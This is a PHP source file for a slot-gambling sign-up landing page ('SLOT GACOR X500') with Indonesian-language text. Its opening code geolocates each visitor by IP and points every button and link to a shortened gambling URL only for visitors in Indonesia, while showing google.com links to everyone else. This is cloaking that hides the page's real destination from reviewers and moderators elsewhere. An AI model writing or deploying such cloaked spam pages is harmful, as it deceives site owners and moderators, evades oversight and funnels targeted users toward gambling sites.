<?php

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE)
{
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}
function getIPAddress()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$link =  [
    'https://tinyurl.com/scatterx1000',
    'https://tinyurl.com/scatterx1000',
    'https://tinyurl.com/scatterx1000',
];
if (ip_info(getIPAddress(), "Country") !== "Indonesia") {
    $link[0] = 'https://www.google.com/';
    $link[1] = 'https://www.google.com/';
    $link[2] = 'https://www.google.com/';
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SLOT GACOR X500</title>
    <link rel="manifest" href="/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="https://i.postimg.cc/hGH1LBJm/favicon.webp">
    <meta name="theme-color" content="#ffffff">

    <link rel="stylesheet" href="/assets/css/bootstrap.min.css">
    <link href='http://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Bungee Shade' rel='stylesheet'>
    <link rel="stylesheet" href="/assets/css/custom.css">
</head>

<body style="background-color:#000000">

    <main>
        <ul class="bubbles" style="z-index:-1">

            <li></li>

            <li></li>

            <li></li>

            <li></li>

            <li></li>

            <li></li>

            <li></li>

            <li></li>

            <li></li>

            <li></li>

        </ul>
        <div class="container mt-4">
        <h1 class=" text-center " style="color:gold">
                <span class="text-center">
                    <img src="https://suksesselalu.click/img/logo.png" alt="logo" style="width:300px;height:75px">
                </span>
            </h1>

            <h4 class="text-center mt-4 text-light"><b>SLOT GACOR X500</b>
            <span class="text-center">
                    </h4>
                    <div class="container mt-4">
        <h1 class=" text-center " style="color:gold">
                <span class="text-center">
                    <img src="https://suksesselalu.click/img/images.webp" alt="logo" style="width:250px;height:250px">
                </span>
            <div class="row d-flex align-items-center justify-content-center mx-4">
                <div class="col-md-4 mx-4">
                    <div class="mt-4 row align-items-center">
                        <a href="<?php echo $link[0] ?>" class="btn btn-primary btn-lg mt-4 d-flex justify-content-center align-items-center">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-person-plus-fill" viewBox="0 0 16 16">
                                <path d="M1 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H1zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z" />
                                <path fill-rule="evenodd" d="M13.5 5a.5.5 0 0 1 .5.5V7h1.5a.5.5 0 0 1 0 1H14v1.5a.5.5 0 0 1-1 0V8h-1.5a.5.5 0 0 1 0-1H13V5.5a.5.5 0 0 1 .5-.5z" />
                            </svg>
                            <span>&nbsp;&nbsp;DAFTAR AKUN GACOR</span>
                        </a>
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
            <h6 class=" text-center mt-4 text-light">Layanan Transaksi dan Livechat Online 24 Jam</h6>
            <div class="d-flex flex-column align-items-center">
                <a class=" text-center" href="<?php echo $link[1] ?>">Privacy Policy</a>
                <a class="text-center " href="<?php echo $link[2] ?>">Hubungi Kami</a>
            </div>
            <h4 class=" text-center mt-4 text-light"><?php echo date('Y') ?> ALL RIGHTS RESERVED</h4>

        </div>
    </main>

    <script src="/assets/js/bootstrap.min.js"></script>
</body>

</html>
